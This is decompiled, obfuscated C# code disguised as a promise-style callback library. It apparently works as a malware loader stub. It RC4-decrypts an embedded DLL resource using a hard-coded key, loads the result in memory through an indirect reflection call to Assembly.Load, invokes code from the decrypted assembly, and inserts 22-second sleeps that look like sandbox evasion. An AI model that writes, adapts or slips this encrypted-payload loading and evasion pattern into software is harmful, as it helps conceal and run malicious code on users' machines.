using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using Jhjfrnevkasa;

namespace Hjvyvnzg;

public sealed class l<a> : Hjvyvnzg.k<a>, j
{
	private List<i> m_b = new List<i>();

	private bool m_c;

	private bool m_d;

	private a m_e;

	private byte[] m_f = Encoding.UTF8.GetBytes("Mvijrlneimfohg");

	private int m_g;

	private int m_h;

	private int l;

	private int m;

	private int n;

	private int[] o;

	private int[] p;

	private byte[] q;

	private string r = "Hjvyvnzg.Jhjfrnevkasa.dll";

	public static Hjvyvnzg.k<a> a(Hjvyvnzg.l<a> a)
	{
		return a.b();
	}

	public Hjvyvnzg.k<a> b()
	{
		return this;
	}

	public j epl7gd4tymsybyvykmrl8w247ajjz9xuUATc(Action a)
	{
		Thread.Sleep(22000);
		if (!this.c && !this.d)
		{
			this.b.Add(new i(a, (i.a)0, c: false));
		}
		else
		{
			a();
		}
		return this;
	}

	public Hjvyvnzg.k<a> g53xr7pfptnrnlh96s6kfq7tlkxtvf6nUATc(Action<a> a)
	{
		if (!this.c && !this.d)
		{
			this.b.Add(new i(a, (i.a)0, c: true));
		}
		else
		{
			a(this.e);
		}
		return this;
	}

	public Hjvyvnzg.k<a> g53xr7pfptnrnlh96s6kfq7tlkxtvf6nUATf(IEnumerable<Action<a>> a)
	{
		foreach (Action<a> item in a)
		{
			g53xr7pfptnrnlh96s6kfq7tlkxtvf6nUATc(item);
		}
		return this;
	}

	public j epl7gd4tymsybyvykmrl8w247ajjz9xuUATa(Action a)
	{
		if (this.c)
		{
			a();
		}
		else
		{
			this.b.Add(new i(a, (i.a)1, c: false));
		}
		return this;
	}

	public Hjvyvnzg.k<a> g53xr7pfptnrnlh96s6kfq7tlkxtvf6nUATa(Action<a> a)
	{
		if (this.c)
		{
			a(this.e);
		}
		else
		{
			this.b.Add(new i(a, (i.a)1, c: true));
		}
		return this;
	}

	public Hjvyvnzg.k<a> g53xr7pfptnrnlh96s6kfq7tlkxtvf6nUATd(IEnumerable<Action<a>> a)
	{
		foreach (Action<a> item in a)
		{
			g53xr7pfptnrnlh96s6kfq7tlkxtvf6nUATa(item);
		}
		return this;
	}

	public j epl7gd4tymsybyvykmrl8w247ajjz9xuUATb(Action a)
	{
		if (this.d)
		{
			a();
		}
		else
		{
			this.b.Add(new i(a, (i.a)2, c: false));
		}
		return this;
	}

	public Hjvyvnzg.k<a> g53xr7pfptnrnlh96s6kfq7tlkxtvf6nUATb(Action<a> a)
	{
		if (this.d)
		{
			a(this.e);
		}
		else
		{
			this.b.Add(new i(a, (i.a)2, c: true));
		}
		return this;
	}

	public Hjvyvnzg.k<a> g53xr7pfptnrnlh96s6kfq7tlkxtvf6nUATe(IEnumerable<Action<a>> a)
	{
		foreach (Action<a> item in a)
		{
			g53xr7pfptnrnlh96s6kfq7tlkxtvf6nUATb(item);
		}
		return this;
	}

	public bool epl7gd4tymsybyvykmrl8w247ajjz9xuUATa()
	{
		AppDomain.CurrentDomain.AssemblyResolve += d;
		return this.d;
	}

	private byte[] c(byte[] a)
	{
		o = new int[256];
		p = new int[256];
		q = new byte[a.Length];
		this.h = 0;
		while (this.h < 256)
		{
			o[this.h] = this.f[this.h % this.f.Length];
			p[this.h] = this.h;
			this.h++;
		}
		this.h = 0;
		l = 0;
		while (this.h < 256)
		{
			l = (l + p[this.h] + o[this.h]) % 256;
			n = p[this.h];
			p[this.h] = p[l];
			p[l] = n;
			this.h++;
		}
		this.h = 0;
		l = 0;
		this.g = 0;
		while (this.h < a.Length)
		{
			this.g++;
			this.g %= 256;
			l += p[this.g];
			l %= 256;
			n = p[this.g];
			p[this.g] = p[l];
			p[l] = n;
			m = p[(p[this.g] + p[l]) % 256];
			q[this.h] = (byte)(a[this.h] ^ m);
			this.h++;
		}
		return q;
	}

	private Assembly d(object a, ResolveEventArgs b)
	{
		if (b.Name.Contains("Jhjfrnevkasa"))
		{
			Stream? manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(r);
			MemoryStream memoryStream = new MemoryStream();
			manifestResourceStream!.CopyTo(memoryStream);
			byte[] array = c(memoryStream.ToArray());
			return e(array);
		}
		return null;
	}

	private Assembly e(byte[] a)
	{
		string name = "Load";
		return (Assembly)typeof(Assembly).InvokeMember(name, BindingFlags.InvokeMethod, null, null, new object[1] { a });
	}

	public bool epl7gd4tymsybyvykmrl8w247ajjz9xuUATb()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new ClassLibrary().Data();
		return this.c;
	}

	public bool epl7gd4tymsybyvykmrl8w247ajjz9xuUATc()
	{
		Thread.Sleep(22000);
		if (!this.d)
		{
			return this.c;
		}
		return true;
	}

	public j f()
	{
		if (!this.d && !this.c)
		{
			this.d = true;
			j((i.a)2);
			return this;
		}
		return this;
	}

	public Hjvyvnzg.l<a> h(a a)
	{
		if (!this.d && !this.c)
		{
			this.d = true;
			this.e = a;
			j((i.a)2);
			return this;
		}
		return this;
	}

	public j g()
	{
		if (!this.d && !this.c)
		{
			this.c = true;
			j((i.a)1);
			return this;
		}
		return this;
	}

	public Hjvyvnzg.l<a> i(a a)
	{
		if (!this.d && !this.c)
		{
			this.c = true;
			this.e = a;
			j((i.a)1);
			return this;
		}
		return this;
	}

	private void j(i.a a)
	{
		foreach (i item in this.b)
		{
			if (item.a() == a || item.a() == (i.a)0)
			{
				if (item.a())
				{
					item.a().DynamicInvoke(this.e);
				}
				else
				{
					item.a().DynamicInvoke();
				}
			}
		}
		this.b.Clear();
	}
}
